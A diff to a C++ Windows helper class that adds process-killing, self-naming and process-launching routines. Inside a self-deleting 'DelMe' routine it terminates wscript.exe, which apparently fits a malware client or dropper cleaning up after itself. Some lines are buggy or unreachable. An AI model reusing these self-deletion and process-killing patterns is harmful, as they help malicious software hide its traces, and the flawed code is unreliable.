@@ -3,7 +3,11 @@
 #include <fstream>
 #include <LM.h>
 #include <wininet.h>
-
+#include <windows.h>
+#include <process.h>
+#include <Tlhelp32.h>
+#include <winbase.h>
+#include <string.h>
 #pragma comment(lib,"wininet")
 
 #include <strsafe.h>
@@ -80,8 +84,34 @@ class Helpers
 			return winver;
 		}
 
+		static void killProcessByName(const char* filename)
+		{
+			HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+			PROCESSENTRY32 pEntry;
+			pEntry.dwSize = sizeof(pEntry);
+			BOOL hRes = Process32First(hSnapShot, &pEntry);
+			while (hRes)
+			{
+				if (strcmp(pEntry.szExeFile, filename) == 0)
+				{
+					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
+						(DWORD)pEntry.th32ProcessID);
+					if (hProcess != NULL)
+					{
+						TerminateProcess(hProcess, 9);
+						CloseHandle(hProcess);
+					}
+				}
+				hRes = Process32Next(hSnapShot, &pEntry);
+			}
+			CloseHandle(hSnapShot);
+		}
+
 		static void DelMe()
 		{
+
+			//killProcessByName("cmd.exe");
+			killProcessByName("wscript.exe");
 			TCHAR szModuleName[MAX_PATH];
 			TCHAR szCmd[2 * MAX_PATH];
 			STARTUPINFO si = { 0 };
@@ -185,6 +215,16 @@ class Helpers
 			GetModuleFileName(NULL, buffer, MAX_PATH);
 			std::string::size_type pos = std::string(buffer).find_last_of("\\/");
 			return std::string(buffer).substr(0, pos);
+		}
+
+		static std::string ExeName() {
+			char buffer[MAX_PATH];
+			GetModuleFileName(NULL, buffer, MAX_PATH);
+			std::string::size_type pos = std::string(buffer).find_last_of("\\/");
+			std::string t = std::string(buffer).substr(pos, pos);
+			t.replace(0, 1, ""); //Remove '\'
+			t.replace(t.length()-4, t.length(), ""); //Remove .exe
+			return t;
 		}
 
 		static std::string checkIfRegKeyExists(std::string key) {
@@ -386,6 +426,26 @@ class Helpers
 			}
 			else {
 				return "success";
+			}
+
+			std::cin.sync();
+			std::cin.ignore();
+		}
+
+		static std::string startNewProcessGetID(std::string file) {
+			STARTUPINFO si = {};
+			si.cb = sizeof si;
+
+			PROCESS_INFORMATION pi = {};
+			const TCHAR* target = TEXT(file.c_str());
+
+			if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
+			{
+				return "failed";
+			}
+			else {
+				CloseHandle(pi.hThread);
+				return std::to_string(GetProcessId(pi.hProcess));
 			}
 
 			std::cin.sync();
